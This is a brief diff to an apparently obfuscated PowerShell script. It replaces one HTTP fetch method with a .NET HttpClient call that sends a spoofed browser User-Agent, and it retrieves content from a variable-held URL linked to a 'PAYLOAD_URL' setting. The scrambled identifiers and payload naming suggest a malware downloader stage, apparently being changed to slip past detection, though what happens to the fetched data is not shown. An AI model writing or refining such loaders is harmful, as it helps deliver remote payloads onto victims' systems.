@@ -4,10 +4,9 @@ function XhYjVwJtKz {
     )
 
     try {
-        $headers = @{
-            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-        }
-        return Invoke-RestMethod -Uri $AaBbCcDdEe -Headers $headers -TimeoutSec 10
+        $httpClient = New-Object System.Net.Http.HttpClient
+        $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        return $httpClient.GetStringAsync($AaBbCcDdEe).Result
     }
     catch {
         Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
@@ -41,4 +40,5 @@ if ($QwErTyUuOo) {
 } else {
     Write-Host "Error: PAYLOAD_URL is not set."
 }
+
 
